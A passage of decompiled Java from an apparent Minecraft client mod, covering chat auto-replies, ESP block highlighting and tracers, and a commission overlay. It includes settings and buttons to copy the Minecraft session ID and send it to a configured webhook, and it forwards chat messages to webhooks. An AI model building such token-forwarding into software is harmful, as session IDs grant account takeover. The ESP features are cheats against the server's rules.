/*     */     
/* 356 */     registerCommand(3, "!melonref", new String[] { "pc melon roles", "pc 15 second p3", "pc sub 4:20 cas" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 361 */     registerCommand(3, "!harryref", new String[] { "pc This content contains explicit content and can not be shown" });
/* 362 */     registerOtherCommand("thetps987");
/* 363 */     registerOtherCommand("serversaved");
/*     */     
/* 365 */     this.chatCommands1 = new MultiBoolSetting("Chat commands 1", this.category1Commands, new ArrayList<>(this.category1Commands));
/* 366 */     this.chatCommands2 = new MultiBoolSetting("Chat Commands 2", this.category2Commands, new ArrayList<>(this.category2Commands));
/* 367 */     this.chatCommands3 = new MultiBoolSetting("Chat Commands 3", this.category3Commands, new ArrayList<>(this.category3Commands));
/* 368 */     this.otherCommandsSetting = new MultiBoolSetting("Other", this.otherCommands, new ArrayList<>(this.otherCommands));
/*     */     
/* 370 */     setGroup(new DefaultGroupSetting("Party Commands", this));
/* 371 */     registerProperty(new Setting[] { (Setting)this.chatCommandSettingsGroup, (Setting)this.levelPrefixGroup, (Setting)this.webhookGroup, (Setting)this.accountShareGroup, (Setting)this.miscGroup, (Setting)this.espGroup, (Setting)this.customHighlightGroup, (Setting)this.commissionOverlayGroup });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 381 */     this.chatCommandSettingsGroup.add(new Setting[] { (Setting)this.enableChatCommands, (Setting)this.partyChatCommandsEnabled, (Setting)this.guildChatCommandsEnabled, (Setting)this.chatCommands1, (Setting)this.chatCommands2, (Setting)this.chatCommands3, (Setting)this.otherCommandsSetting, (Setting)this.enableAllButton, (Setting)this.disableAllButton });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 391 */     this.webhookGroup.add(new Setting[] { (Setting)this.webhookEnabled, (Setting)this.webhookLink, (Setting)this.guildChatWebhookEnabled, (Setting)this.guildChatWebhook, (Setting)this.partyChatWebhookEnabled, (Setting)this.partyChatWebhook, (Setting)this.privateMessagesWebhookEnabled, (Setting)this.privateMessagesWebhook });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 402 */     this.accountShareGroup.add(new Setting[] { (Setting)this.accountShareEnabled, (Setting)this.loginNotifierWebhookEnabled, (Setting)this.loginNotifierWebhook, (Setting)this.ssidWebhook, (Setting)this.copyMinecraftSsidButton, (Setting)this.sendMinecraftSsidButton });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 411 */     this.levelPrefixGroup.add(new Setting[] { (Setting)this.levelPrefixEnable, (Setting)this.red480Plus, (Setting)this.goldBrackets, (Setting)this.diamondBrackets });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 422 */     this.miscGroup.add(new Setting[] { (Setting)this.miscEnabled, (Setting)this.ptwKeybind, (Setting)this.glorpWarp });
/* 423 */     this.espGroup.add(new Setting[] { (Setting)this.espEnabled, (Setting)this.titaniumHighlightEnabled, (Setting)this.nodeHighlightEnabled, (Setting)this.tracerEnabled, (Setting)this.tracerClosestOnly, (Setting)this.tracerThicknessPx });
/* 424 */     this.customHighlightGroup.add(new Setting[] { (Setting)this.customHighlightEnabled, (Setting)this.customHighlightNames, (Setting)this.customIgnoreZeroHealth, (Setting)this.customTracerEnabled, (Setting)this.customTracerClosestOnly, (Setting)this.customTracerThicknessPx });
/* 425 */     this.commissionOverlayGroup.add(new Setting[] { (Setting)this.commissionOverlayEnabled, (Setting)this.commissionOverlayPosition, (Setting)this.commissionPeekEnabled, (Setting)this.commissionPeekKeybindSetting, (Setting)this.commissionOnlyRoyalPigeonInventory, (Setting)this.commissionOnlyRoyalPigeonHotbar }); }
/*     */   public ButtonSetting getCopyMinecraftSsidButton() { return this.copyMinecraftSsidButton; }
/*     */   public ButtonSetting getSendMinecraftSsidButton() { return this.sendMinecraftSsidButton; }
/*     */   public String getCachedWebhookInput() { return this.cachedWebhookInput; }
/*     */   public String getCachedWebhookResolved() { return this.cachedWebhookResolved; }
/*     */   public String getLastKnownServerAddress() { return this.lastKnownServerAddress; }
/*     */   public String getLastLoginNotifierEvent() { return this.lastLoginNotifierEvent; }
/*     */   public boolean isPendingSsidSend() { return this.pendingSsidSend; }
/* 435 */   public static boolean isLevelPrefixEnabled() { return (instance != null && instance.isEnabled() && ((Boolean)instance.levelPrefixEnable.getValue()).booleanValue()); }
/*     */   public String getPendingSsidPayload() { return this.pendingSsidPayload; }
/*     */   public MultiBoolSetting getChatCommands1() { return this.chatCommands1; }
/*     */   public MultiBoolSetting getChatCommands2() { return this.chatCommands2; }
/* 439 */   public MultiBoolSetting getChatCommands3() { return this.chatCommands3; } public MultiBoolSetting getOtherCommandsSetting() { return this.otherCommandsSetting; } public ButtonSetting getEnableAllButton() { return this.enableAllButton; } public ButtonSetting getDisableAllButton() { return this.disableAllButton; } public static boolean isRed480PlusEnabled() { return (instance != null && instance.isEnabled() && ((Boolean)instance.red480Plus.getValue()).booleanValue()); }
/*     */ 
/*     */   
/*     */   public static boolean isGoldBracketsEnabled() {
/* 443 */     return (instance != null && instance.isEnabled() && ((Boolean)instance.goldBrackets.getValue()).booleanValue());
/*     */   }
/*     */   
/*     */   public static boolean isDiamondBracketsEnabled() {
/* 447 */     return (instance != null && instance.isEnabled() && ((Boolean)instance.diamondBrackets.getValue()).booleanValue());
/*     */   }
/*     */   
/*     */   private Setting<?> createPtwKeybindSetting() {
/*     */     try {
/* 452 */       Class<?> keybindClass = Class.forName("com.ricedotwho.rsm.data.Keybind");
/* 453 */       Constructor<?> keybindConstructor = keybindClass.getConstructor(new Class[] { int.class, boolean.class, Runnable.class });
/* 454 */       Object keybind = keybindConstructor.newInstance(new Object[] { Integer.valueOf(-1), Boolean.valueOf(false), (Runnable)this::sendPtThenW });
/* 455 */       Class<?> keybindSettingClass = Class.forName("com.ricedotwho.rsm.ui.clickgui.settings.impl.KeybindSetting");
/* 456 */       Constructor<?> keybindSettingConstructor = keybindSettingClass.getConstructor(new Class[] { String.class, keybindClass });
/* 457 */       Object setting = keybindSettingConstructor.newInstance(new Object[] { "PT/W Keybind", keybind });
/* 458 */       if (setting instanceof Setting) {
/* 459 */         return (Setting)setting;
/*     */       }
/* 461 */     } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */ 
/* 463 */     return (Setting<?>)new ButtonSetting("PT/W Keybind", "", () -> ChatUtils.chat(String.valueOf(class_124.field_1061) + "PT/W keybind unavailable in this runtime.", new Object[0]));
/*     */   }
/*     */   
/*     */   private Setting<?> createCommissionPeekKeybindSetting() {
/*     */     try {
/* 467 */       Class<?> keybindClass = Class.forName("com.ricedotwho.rsm.data.Keybind");
/* 468 */       Constructor<?> keybindConstructor = keybindClass.getConstructor(new Class[] { int.class, boolean.class, Runnable.class });
/* 469 */       Object keybind = keybindConstructor.newInstance(new Object[] { Integer.valueOf(-1), Boolean.valueOf(false), (Runnable)(() -> {}) });
/* 470 */       this.commissionPeekKeybind = keybind;
/* 471 */       Class<?> keybindSettingClass = Class.forName("com.ricedotwho.rsm.ui.clickgui.settings.impl.KeybindSetting");
/*     */       try {
/* 473 */         Constructor<?> constructor = keybindSettingClass.getConstructor(new Class[] { String.class, keybindClass, Runnable.class, java.util.function.BooleanSupplier.class });
/* 474 */         Object setting = constructor.newInstance(new Object[] { "Peek Keybind", keybind, (Runnable)(() -> {}), (java.util.function.BooleanSupplier)(() -> (((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue() && ((Boolean)this.commissionPeekEnabled.getValue()).booleanValue())) });
/* 475 */         if (setting instanceof Setting) {
/* 476 */           return (Setting)setting;
/*     */         }
/* 478 */       } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */ 
/* 480 */       Constructor<?> keybindSettingConstructor = keybindSettingClass.getConstructor(new Class[] { String.class, keybindClass });
/* 481 */       Object fallbackSetting = keybindSettingConstructor.newInstance(new Object[] { "Peek Keybind", keybind });
/* 482 */       if (fallbackSetting instanceof Setting) {
/* 483 */         return (Setting)fallbackSetting;
/*     */       }
/* 485 */     } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */ 
/* 487 */     this.commissionPeekKeybind = null;
/* 488 */     return (Setting<?>)new ButtonSetting("Peek Keybind", "", () -> ChatUtils.chat(String.valueOf(class_124.field_1061) + "Peek keybind unavailable in this runtime.", new Object[0]));
/*     */   }
/*     */   
/*     */   private boolean isCommissionPeekKeyActive() {
/* 492 */     if (this.commissionPeekKeybind == null) {
/* 493 */       return false;
/*     */     }
/*     */     try {
/* 496 */       Object active = this.commissionPeekKeybind.getClass().getMethod("isActive", new Class[0]).invoke(this.commissionPeekKeybind, new Object[0]);
/* 497 */       return (active instanceof Boolean && ((Boolean)active).booleanValue());
/* 498 */     } catch (ReflectiveOperationException reflectiveOperationException) {
/* 499 */       return false;
/*     */     } 
/*     */   }
/*     */   
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onChat(ChatEvent event) {
/* 490 */     String raw = extractEventMessage(event);
/* 491 */     String message = class_124.method_539(raw);
/*     */     
/* 493 */     if (this.mc.field_1724 == null || this.mc.field_1724.field_3944 == null)
/* 494 */       return;  if (((Boolean)this.miscEnabled.getValue()).booleanValue() && ((Boolean)this.glorpWarp.getValue()).booleanValue() && message.contains("Party > [MVP+] glorpiline: Entered a ")) {
/* 495 */       this.mc.field_1724.field_3944.method_45730("pc !pt glorpiline");
/* 496 */       CompletableFuture.delayedExecutor(400L, TimeUnit.MILLISECONDS).execute(() -> this.mc.execute(() -> this.mc.field_1724.field_3944.method_45730("pc !w")));
/*     */     } 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 505 */     if (!((Boolean)this.enableChatCommands.getValue()).booleanValue())
/* 506 */       return;  sendWebhookMessage(message);
/*     */     
/* 508 */     if (message.equals("Guild > TheAdmin987 joined.") && this.otherCommandsSetting.getValuesList().contains("thetps987")) {
/* 509 */       this.mc.field_1724.field_3944.method_45730("gc !tps");
/*     */     }
/* 511 */     if (message.equals("Guild > TheAdmin987 left.") && this.otherCommandsSetting.getValuesList().contains("serversaved")) {
/* 512 */       this.mc.field_1724.field_3944.method_45730("gc server saved");
/*     */     }
/*     */     
/* 515 */     if (message.equals("Starting in 4 seconds.")) {
/* 516 */       this.mc.field_1724.field_3944.method_45730("pc In Green Room");
/*     */     }
/*     */     
/* 519 */     String chatPrefix = null;
/* 520 */     if (isPartyChatMessage(raw, message) && ((Boolean)this.partyChatCommandsEnabled.getValue()).booleanValue()) {
/* 521 */       chatPrefix = "pc";
/* 522 */     } else if (isGuildChatMessage(raw, message) && ((Boolean)this.guildChatCommandsEnabled.getValue()).booleanValue()) {
/* 523 */       chatPrefix = "gc";
/*     */     } 
/* 525 */     if (chatPrefix == null)
/*     */       return; 
/* 521 */     int colonIndex = message.indexOf(": ");
/* 522 */     if (colonIndex == -1)
/*     */       return; 
/* 524 */     String content = message.substring(colonIndex + 2).toLowerCase(Locale.ROOT);
/*     */     
/* 526 */     if (content.contains("dt") && !content.contains("holy dt")) {
/* 527 */       scheduleResponses(List.of(new ScheduledLine(200L, "holy dt")), chatPrefix);
/*     */     }
/*     */     
/* 530 */     if (content.contains("1s") && !content.contains("holy fat")) {
/* 531 */       scheduleResponses(List.of(new ScheduledLine(200L, "holy fat")), chatPrefix);
/*     */     }
/*     */     
/* 534 */     if (content.contains("67") && !content.contains("i love 67")) {
/* 535 */       scheduleResponses(List.of(new ScheduledLine(200L, "i love 67")), chatPrefix);
/*     */     }
/*     */     
/* 538 */     if (!isCommandEnabled(content)) {
/*     */       return;
/*     */     }
/*     */     
/* 542 */     List<ScheduledLine> responses = this.commandResponses.get(content);
/* 543 */     if (responses == null || responses.isEmpty()) {
/*     */       return;
/*     */     }
/*     */     
/* 547 */     scheduleResponses(responses, chatPrefix);
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onClientTick(ClientTickEvent.End event) {
/* 551 */     if (!isEnabled()) {
/* 552 */       clearEspData();
/* 553 */       clearCustomHighlightData();
/* 554 */       clearCommissionOverlayData();
/*     */       return;
/*     */     }
/* 556 */     if (this.mc.field_1687 == null || this.mc.field_1724 == null) {
/* 557 */       clearEspData();
/* 558 */       clearCustomHighlightData();
/* 559 */       clearCommissionOverlayData();
/*     */       return;
/*     */     }
/* 561 */     if (((Boolean)this.espEnabled.getValue()).booleanValue()) {
/* 562 */       boolean titaniumOn = ((Boolean)this.titaniumHighlightEnabled.getValue()).booleanValue();
/* 563 */       boolean nodeOn = ((Boolean)this.nodeHighlightEnabled.getValue()).booleanValue();
/* 564 */       if (!titaniumOn && !nodeOn) {
/* 565 */         clearEspData();
/* 566 */         this.espScanInitialized = true;
/*     */       } else {
/* 568 */         this.titaniumTickCounter++;
/* 569 */         class_2338 playerPos = this.mc.field_1724.method_24515();
/* 570 */         int px = playerPos.method_10263();
/* 571 */         int py = playerPos.method_10264();
/* 572 */         int pz = playerPos.method_10260();
/* 573 */         boolean moved = (px != this.lastEspScanX || py != this.lastEspScanY || pz != this.lastEspScanZ);
/* 574 */         int interval = moved ? ESP_SCAN_INTERVAL_TICKS : ESP_SCAN_IDLE_INTERVAL_TICKS;
/* 575 */         if (!this.espScanInitialized || moved || this.titaniumTickCounter % interval == 0) {
/* 576 */           updateEspBlocks();
/*     */         }
/*     */       } 
/*     */     } else {
/* 580 */       clearEspData();
/*     */     } 
/* 582 */     if (((Boolean)this.customHighlightEnabled.getValue()).booleanValue()) {
/* 583 */       this.customHighlightTickCounter++;
/* 584 */       updateCustomHighlightData();
/*     */     } else {
/* 586 */       clearCustomHighlightData();
/*     */     } 
/* 588 */     if (((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue()) {
/* 589 */       this.commissionOverlayTickCounter++;
/* 590 */       if (this.commissionOverlayLines.isEmpty() || this.commissionOverlayTickCounter % COMMISSION_SCAN_INTERVAL_TICKS == 0) {
/* 591 */         updateCommissionOverlayData();
/*     */       }
/*     */     } else {
/* 594 */       clearCommissionOverlayData();
/*     */     } 
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onRender3D(Render3DEvent.Last event) {
/* 563 */     if (!isEnabled()) {
/*     */       return;
/*     */     }
/* 566 */     if (!this.titaniumRenderBridgeReady) {
/* 567 */       this.titaniumRenderBridgeReady = initTitaniumRenderBridge();
/* 568 */       if (!this.titaniumRenderBridgeReady) {
/*     */         return;
/*     */       }
/*     */     }
/* 572 */     if (((Boolean)this.espEnabled.getValue()).booleanValue()) {
/* 573 */       if (((Boolean)this.titaniumHighlightEnabled.getValue()).booleanValue() && this.titaniumRenderTasks.isEmpty() && !this.titaniumBlocks.isEmpty()) {
/* 574 */         rebuildRenderTasks(this.titaniumBlocks, this.titaniumRenderTasks, TITANIUM_FILL_COLOUR, TITANIUM_OUTLINE_COLOUR);
/*     */       }
/* 576 */       if (((Boolean)this.nodeHighlightEnabled.getValue()).booleanValue() && this.nodeRenderTasks.isEmpty() && !this.nodeBlocks.isEmpty()) {
/* 577 */         rebuildRenderTasks(this.nodeBlocks, this.nodeRenderTasks, NODE_FILL_COLOUR, NODE_OUTLINE_COLOUR);
/*     */       }
/* 579 */       renderBlockTasks(this.titaniumRenderTasks, (Boolean)this.titaniumHighlightEnabled.getValue());
/* 580 */       renderBlockTasks(this.nodeRenderTasks, (Boolean)this.nodeHighlightEnabled.getValue());
/*     */     }
/*     */     try {
/* 582 */       renderBlockTasks(this.customEntityRenderTasks, (Boolean)this.customHighlightEnabled.getValue());
/* 583 */     } catch (Throwable throwable) {
/* 584 */       clearCustomHighlightData();
/*     */     } 
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onRender3DStart(Render3DEvent.Start event) {
/* 586 */     if (!isEnabled()) {
/*     */       return;
/*     */     }
/* 589 */     if (((Boolean)this.espEnabled.getValue()).booleanValue()) {
/* 590 */       renderEspTracers(event);
/*     */     }
/*     */     try {
/* 592 */       rebuildCustomHighlightFrameData();
/* 593 */       renderCustomEntityTracers(event);
/* 594 */     } catch (Throwable throwable) {
/* 595 */       clearCustomHighlightData();
/*     */     } 
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onRender2D(Render2DEvent event) {
/* 599 */     if (!isEnabled() || !shouldRenderCommissionOverlay()) {
/*     */       return;
/*     */     }
/* 602 */     if (this.commissionOverlayLines.isEmpty()) {
/* 603 */       updateCommissionOverlayData();
/* 604 */       if (this.commissionOverlayLines.isEmpty()) {
/*     */         return;
/*     */       }
/*     */     } 
/*     */     try {
/* 609 */       Object gfxObject = invokeNoArg(event, new String[] { "getGfx" });
/* 610 */       if (gfxObject == null) {
/*     */         return;
/*     */       }
/* 613 */       CommissionOverlayMetrics metrics = getCommissionOverlayMetrics();
/* 614 */       if (metrics == null) {
/*     */         return;
/*     */       }
/* 617 */       renderCommissionOverlayWithDrag(gfxObject, metrics);
/* 619 */     } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */   }
/*     */   
/*     */   private void renderCommissionOverlayWithDrag(Object gfxObject, CommissionOverlayMetrics metrics) {
/* 623 */     if (gfxObject == null || metrics == null) {
/*     */       return;
/*     */     }
/* 626 */     Runnable draw = () -> {
/* 628 */         renderCommissionOverlay(0.0F, 0.0F, metrics);
/*     */       };
/* 631 */     float width = metrics.boxWidth();
/* 632 */     float height = metrics.boxHeight();
/* 633 */     if (invokeDragRenderMethod("renderScaled", gfxObject, draw, width, height)) {
/*     */       return;
/*     */     }
/* 636 */     invokeDragRenderMethod("renderScaledGFX", gfxObject, draw, width, height);
/*     */   }
/*     */   
/*     */   private boolean invokeDragRenderMethod(String methodName, Object gfxObject, Runnable draw, float width, float height) {
/* 640 */     if (methodName == null || gfxObject == null || draw == null) {
/* 641 */       return false;
/*     */     }
/* 643 */     for (Method method : this.commissionOverlayPosition.getClass().getMethods()) {
/* 644 */       if (!methodName.equals(method.getName()) || method.getParameterCount() != 4) {
/*     */         continue;
/*     */       }
/*     */       try {
/* 648 */         method.invoke(this.commissionOverlayPosition, new Object[] { gfxObject, draw, Float.valueOf(width), Float.valueOf(height) });
/* 649 */         return true;
/* 650 */       } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */     } 
/* 652 */     return false;
/*     */   }
/*     */   
/*     */   private CommissionOverlayMetrics getCommissionOverlayMetrics() {
/* 656 */     if (this.commissionOverlayLines.isEmpty()) {
/* 657 */       return null;
/*     */     }
/* 659 */     float padding = 16.0F;
/* 660 */     float titleSize = 19.0F;
/* 661 */     float lineSize = 15.0F;
/* 662 */     float rsaSize = 14.0F;
/* 663 */     float lineGap = 12.0F;
/* 664 */     float barTopGap = 6.0F;
/* 665 */     float barHeight = 7.0F;
/* 666 */     float footerGap = 16.0F;
/* 667 */     float radius = 11.0F;
/* 668 */     float barRadius = 3.5F;
/* 669 */     float outlineThickness = 2.0F;
/* 670 */     float minWidth = 270.0F;
/* 671 */     float maxWidth = 0.0F;
/* 668 */     for (int i = 0; i < this.commissionOverlayLines.size(); i++) {
/* 669 */       String line = this.commissionOverlayLines.get(i);
/* 670 */       float size = (i == 0) ? titleSize : lineSize;
/* 671 */       maxWidth = Math.max(maxWidth, NVGUtils.getTextWidth(line, size, NVGUtils.ROBOTO));
/*     */     }
/* 673 */     float rWidth = NVGUtils.getTextWidth("R", rsaSize, NVGUtils.ROBOTO);
/* 674 */     float sWidth = NVGUtils.getTextWidth("S", rsaSize, NVGUtils.ROBOTO);
/* 675 */     float aWidth = NVGUtils.getTextWidth("A", rsaSize, NVGUtils.ROBOTO);
/* 676 */     float rsaWidth = rWidth + sWidth + aWidth;
/* 677 */     float titleHeight = NVGUtils.getTextHeight(titleSize, NVGUtils.ROBOTO);
/* 678 */     float lineHeight = NVGUtils.getTextHeight(lineSize, NVGUtils.ROBOTO);
/* 679 */     float rsaHeight = NVGUtils.getTextHeight(rsaSize, NVGUtils.ROBOTO);
/* 680 */     float bodyStartY = padding + titleHeight + 12.0F;
/* 681 */     int bodyLines = Math.max(0, this.commissionOverlayLines.size() - 1);
/* 682 */     float bodyHeight = bodyLines * (lineHeight + barTopGap + barHeight) + Math.max(0, bodyLines - 1) * lineGap;
/* 683 */     float rsaY = bodyStartY + bodyHeight + footerGap;
/* 684 */     float boxWidth = Math.max(minWidth, Math.max(maxWidth + padding * 2.0F + 16.0F, rsaWidth + padding * 2.0F + 16.0F));
/* 685 */     float boxHeight = rsaY + rsaHeight + padding;
/* 686 */     return new CommissionOverlayMetrics(boxWidth, boxHeight, padding, titleSize, lineSize, rsaSize, lineGap, barTopGap, barHeight, barRadius, padding, bodyStartY, rsaY, radius, outlineThickness);
/*     */   }
/*     */   
/*     */   private void renderCommissionOverlay(float left, float top, CommissionOverlayMetrics metrics) {
/* 691 */     if (metrics == null || this.commissionOverlayLines.isEmpty()) {
/*     */       return;
/*     */     }
/* 694 */     float boxWidth = metrics.boxWidth();
/* 695 */     float boxHeight = metrics.boxHeight();
/* 696 */     float padding = metrics.padding();
/* 697 */     NVGUtils.drawRect(left, top, boxWidth, boxHeight, metrics.radius(), COMMISSION_PANEL_FILL);
/* 698 */     NVGUtils.drawOutlineRect(left, top, boxWidth, boxHeight, metrics.radius(), metrics.outlineThickness(), COMMISSION_PANEL_OUTLINE);
/* 699 */     if (!this.commissionOverlayLines.isEmpty()) {
/* 700 */       String title = this.commissionOverlayLines.get(0);
/* 701 */       float titleWidth = NVGUtils.getTextWidth(title, metrics.titleSize(), NVGUtils.ROBOTO);
/* 702 */       float titleX = left + (boxWidth - titleWidth) / 2.0F;
/* 703 */       NVGUtils.drawText(title, titleX, top + metrics.titleY(), metrics.titleSize(), COMMISSION_TITLE_COLOUR, NVGUtils.ROBOTO);
/*     */     }
/* 705 */     float textY = top + metrics.bodyStartY();
/* 706 */     float lineHeight = NVGUtils.getTextHeight(metrics.lineSize(), NVGUtils.ROBOTO);
/* 706 */     for (int i = 1; i < this.commissionOverlayLines.size(); i++) {
/* 633 */       String line = this.commissionOverlayLines.get(i);
/* 634 */       Colour color = getCommissionLineColour(line);
/* 635 */       NVGUtils.drawText(line, left + padding, textY, metrics.lineSize(), color, NVGUtils.ROBOTO);
/* 636 */       double progress = getCommissionProgressPercent(line);
/* 637 */       if (progress < 0.0D) {
/* 638 */         progress = 0.0D;
/*     */       }
/* 640 */       float barY = textY + lineHeight + metrics.barTopGap();
/* 641 */       float barWidth = boxWidth - padding * 2.0F;
/* 642 */       drawCommissionProgressBar(left + padding, barY, barWidth, metrics.barHeight(), metrics.barRadius(), progress);
/* 643 */       textY += lineHeight + metrics.barTopGap() + metrics.barHeight() + metrics.lineGap();
/*     */     } 
/* 638 */     float rsaSize = metrics.rsaSize();
/* 639 */     float rWidth = NVGUtils.getTextWidth("R", rsaSize, NVGUtils.ROBOTO);
/* 640 */     float sWidth = NVGUtils.getTextWidth("S", rsaSize, NVGUtils.ROBOTO);
/* 641 */     float aWidth = NVGUtils.getTextWidth("A", rsaSize, NVGUtils.ROBOTO);
/* 642 */     float rsaTotalWidth = rWidth + sWidth + aWidth;
/* 643 */     float rsaX = left + (boxWidth - rsaTotalWidth) / 2.0F;
/* 644 */     float rsaY = top + metrics.rsaY();
/* 645 */     NVGUtils.drawText("R", rsaX, rsaY, rsaSize, RSA_R_COLOUR, NVGUtils.ROBOTO);
/* 646 */     rsaX += rWidth;
/* 647 */     NVGUtils.drawText("S", rsaX, rsaY, rsaSize, RSA_S_COLOUR, NVGUtils.ROBOTO);
/* 648 */     rsaX += sWidth;
/* 649 */     NVGUtils.drawText("A", rsaX, rsaY, rsaSize, RSA_A_COLOUR, NVGUtils.ROBOTO);
/*     */   }
/*     */   
/*     */   private Colour getCommissionLineColour(String line) {
/* 641 */     if (line == null || line.isBlank()) {
/* 642 */       return COMMISSION_TEXT_DEFAULT;
/*     */     }
/* 644 */     double percent = getCommissionProgressPercent(line);
/* 645 */     if (percent >= 0.0D) {
/* 646 */       if (percent <= 0.0D) return COMMISSION_TEXT_ZERO; 
/* 647 */       if (percent >= 100.0D) return COMMISSION_TEXT_DONE; 
/* 648 */       return COMMISSION_TEXT_PROGRESS;
/*     */     }
/* 657 */     return COMMISSION_TEXT_DEFAULT;
/*     */   }
/*     */   
/*     */   private double getCommissionProgressPercent(String line) {
/* 661 */     if (line == null || line.isBlank()) {
/* 662 */       return -1.0D;
/*     */     }
/* 664 */     Matcher matcher = COMMISSION_PERCENT_PATTERN.matcher(line);
/* 665 */     if (matcher.find()) {
/*     */       try {
/* 667 */         double percent = Double.parseDouble(matcher.group(1));
/* 668 */         return Math.max(0.0D, Math.min(100.0D, percent));
/* 669 */       } catch (NumberFormatException numberFormatException) {}
/*     */     }
/* 671 */     String lower = line.toLowerCase(Locale.ROOT);
/* 672 */     if (lower.endsWith("done") || lower.endsWith("completed")) {
/* 673 */       return 100.0D;
/*     */     }
/* 675 */     return -1.0D;
/*     */   }
/*     */   
/*     */   private void drawCommissionProgressBar(float x, float y, float width, float height, float radius, double percent) {
/* 679 */     if (width <= 0.0F || height <= 0.0F) {
/*     */       return;
/*     */     }
/* 682 */     NVGUtils.drawRect(x, y, width, height, radius, COMMISSION_PROGRESS_TRACK);
/* 683 */     float clampedPercent = (float)Math.max(0.0D, Math.min(100.0D, percent));
/* 684 */     float fillWidth = width * clampedPercent / 100.0F;
/* 685 */     if (fillWidth <= 0.5F) {
/*     */       return;
/*     */     }
/* 688 */     int strips = Math.max(1, Math.round(fillWidth));
/* 689 */     float stripWidth = fillWidth / strips;
/* 690 */     for (int i = 0; i < strips; i++) {
/* 691 */       float t = (strips <= 1) ? 0.0F : (i / (float)(strips - 1));
/* 692 */       float stripX = x + i * stripWidth;
/* 693 */       float stripW = (i == strips - 1) ? (x + fillWidth - stripX) : stripWidth;
/* 694 */       float stripRadius = (strips == 1 || i == 0 || i == strips - 1) ? radius : 0.0F;
/* 695 */       NVGUtils.drawRect(stripX, y, stripW + 0.05F, height, stripRadius, interpolateCommissionProgressColour(t));
/*     */     } 
/*     */   }
/*     */   
/*     */   private Colour interpolateCommissionProgressColour(float t) {
/* 700 */     float clampedT = Math.max(0.0F, Math.min(1.0F, t));
/* 701 */     int red = Math.round(COMMISSION_PROGRESS_START.getRed() + (COMMISSION_PROGRESS_END.getRed() - COMMISSION_PROGRESS_START.getRed()) * clampedT);
/* 702 */     int green = Math.round(COMMISSION_PROGRESS_START.getGreen() + (COMMISSION_PROGRESS_END.getGreen() - COMMISSION_PROGRESS_START.getGreen()) * clampedT);
/* 703 */     int blue = Math.round(COMMISSION_PROGRESS_START.getBlue() + (COMMISSION_PROGRESS_END.getBlue() - COMMISSION_PROGRESS_START.getBlue()) * clampedT);
/* 704 */     return new Colour(red, green, blue, 255);
/*     */   }
/*     */   
/*     */   private boolean shouldRenderCommissionOverlay() {
/* 661 */     if (!((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue()) {
/* 662 */       return false;
/*     */     }
/* 663 */     if (!this.commissionHeaderDetected || this.commissionOverlayLines.isEmpty()) {
/* 664 */       return false;
/*     */     }
/* 664 */     if (((Boolean)this.commissionPeekEnabled.getValue()).booleanValue() && !isCommissionPeekKeyActive()) {
/* 665 */       return false;
/*     */     }
/* 667 */     if (((Boolean)this.commissionOnlyRoyalPigeonInventory.getValue()).booleanValue() && !hasRoyalPigeonInInventory(false)) {
/* 668 */       return false;
/*     */     }
/* 670 */     if (((Boolean)this.commissionOnlyRoyalPigeonHotbar.getValue()).booleanValue() && !hasRoyalPigeonInInventory(true)) {
/* 671 */       return false;
/*     */     }
/* 673 */     return true;
/*     */   }
/*     */   
/*     */   private boolean hasRoyalPigeonInInventory(boolean hotbarOnly) {
/* 677 */     if (this.mc.field_1724 == null) {
/* 678 */       return false;
/*     */     }
/* 680 */     class_1661 inventory = this.mc.field_1724.method_31548();
/* 681 */     if (inventory == null) {
/* 682 */       return false;
/*     */     }
/* 684 */     int size = inventory.method_5439();
/* 685 */     int scanLimit = hotbarOnly ? Math.min(size, class_1661.method_7368()) : size;
/* 686 */     for (int i = 0; i < scanLimit; i++) {
/* 687 */       class_1799 stack = inventory.method_5438(i);
/* 688 */       if (isRoyalPigeonStack(stack)) {
/* 689 */         return true;
/*     */       }
/*     */     } 
/* 692 */     return false;
/*     */   }
/*     */   
/*     */   private boolean isRoyalPigeonStack(class_1799 stack) {
/* 696 */     if (stack == null || stack.method_7960()) {
/* 697 */       return false;
/*     */     }
/* 699 */     class_2561 name = stack.method_7964();
/* 700 */     if (name == null) {
/* 701 */       return false;
/*     */     }
/* 703 */     String cleaned = class_124.method_539(name.getString()).trim().toLowerCase(Locale.ROOT);
/* 704 */     return cleaned.contains("royal pigeon");
/*     */   }
/*     */   
/*     */   private void updateCommissionOverlayData() {
/* 661 */     this.commissionOverlayLines.clear();
/* 662 */     this.commissionHeaderDetected = false;
/* 662 */     if (!isEnabled() || !((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue()) {
/*     */       return;
/*     */     }
/* 665 */     List<String> tabLines = readTabMenuLines();
/* 666 */     if (tabLines.isEmpty()) {
/*     */       return;
/*     */     }
/* 669 */     int startIndex = -1;
/* 670 */     for (int i = 0; i < tabLines.size(); i++) {
/* 671 */       if (isCommissionHeaderLine(tabLines.get(i))) {
/* 672 */         startIndex = i + 1;
/* 673 */         this.commissionHeaderDetected = true;
/*     */         break;
/*     */       } 
/*     */     } 
/* 676 */     if (startIndex < 0) {
/*     */       return;
/*     */     }
/* 679 */     this.commissionOverlayLines.add("Commissions");
